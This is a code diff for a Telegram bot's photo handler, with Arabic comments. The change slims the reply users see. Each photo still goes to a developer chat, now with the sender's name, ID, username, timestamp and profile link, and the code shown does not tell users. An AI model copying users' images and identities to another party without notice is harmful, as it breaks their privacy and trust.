@@ -957,11 +957,11 @@ def health_check(message):
     bot.reply_to(message, health_status, parse_mode="Markdown")
 
 # ========================================================
-# ✅ معالجة الصور الواردة وإرسال نسخة للمطور
+# ✅ الجزء المعدل: معالجة الصور
 # ========================================================
 @bot.message_handler(content_types=['photo'])
 def handle_photos(message):
-    """معالجة الصور الواردة وإرسال نسخة للمطور"""
+    """معالجة الصور الواردة - للمستخدم رسالة بسيطة، للمطور معلومات كاملة"""
     global total_photos_received
     user_id = message.chat.id
     user_name = message.from_user.first_name
@@ -991,44 +991,45 @@ def handle_photos(message):
     file_info = bot.get_file(photo.file_id)
     file_size = file_info.file_size / 1024
 
-    # ✅ إرسال تأكيد للمستخدم
-    caption = (
-        f"✅ تم استلام صورة جديدة!\n\n"
-        f"👤 من: {user_name}\n"
-        f"🆔 المعرف: `{user_id}`\n"
-        f"📝 اليوزر: @{username}\n"
+    # ============================================
+    # ✅ 1. إرسال تأكيد بسيط للمستخدم (بدون معلومات)
+    # ============================================
+    user_caption = (
+        f"✅ تم استلام صورتك بنجاح!\n"
         f"📏 الحجم: {file_size:.1f} كيلوبايت\n"
-        f"🖼️ إجمالي صورك: {user_stats[user_id]['photo_count']}\n"
-        f"📊 الإجمالي الكلي: {total_photos_received}"
+        f"📸 إجمالي صورك: {user_stats[user_id]['photo_count']}"
     )
-    bot.reply_to(message, caption, parse_mode="Markdown")
+    bot.reply_to(message, user_caption)
     
-    # ✅ إرسال نسخة للمطور مع معلومات إضافية
+    # ============================================
+    # ✅ 2. إرسال للمطور مع معلومات كاملة
+    # ============================================
     try:
         developer_caption = (
             f"📸 *صورة جديدة من المستخدم*\n\n"
-            f"👤 الاسم: {user_name}\n"
-            f"🆔 المعرف: `{user_id}`\n"
-            f"📝 اليوزر: @{username}\n"
-            f"📏 الحجم: {file_size:.1f} كيلوبايت\n"
-            f"📅 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-            f"📊 إجمالي صور المستخدم: {user_stats[user_id]['photo_count']}\n"
-            f"📊 إجمالي الصور الكلي: {total_photos_received}"
+            f"👤 *الاسم:* {user_name}\n"
+            f"🆔 *المعرف:* `{user_id}`\n"
+            f"📝 *اليوزر:* @{username}\n"
+            f"📏 *الحجم:* {file_size:.1f} كيلوبايت\n"
+            f"📅 *الوقت:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+            f"📊 *إجمالي صوره:* {user_stats[user_id]['photo_count']}\n"
+            f"📊 *إجمالي الصور الكلي:* {total_photos_received}\n"
+            f"🔗 *رابط المستخدم:* [اضغط هنا](tg://user?id={user_id})"
         )
         
-        # إرسال الصورة للمطور مع caption
+        # إرسال الصورة للمطور مع caption مفصل
         bot.send_photo(
             DEVELOPER_CHAT_ID,
             photo.file_id,
             caption=developer_caption,
             parse_mode="Markdown"
         )
-        logger.info(f"Forwarded photo from {user_name} (ID: {user_id}) to developer")
+        logger.info(f"📤 تم إرسال صورة من {user_name} (ID: {user_id}) إلى المطور")
         
     except Exception as e:
-        logger.error(f"Failed to forward photo to developer: {e}")
+        logger.error(f"❌ فشل إرسال الصورة للمطور: {e}")
 
-    logger.info(f"Received photo from {user_name} (ID: {user_id}) - Size: {file_size:.1f}KB")
+    logger.info(f"📥 استلام صورة من {user_name} (ID: {user_id}) - الحجم: {file_size:.1f}KB")
 
 @bot.message_handler(commands=['exportdata'])
 def export_data(message):
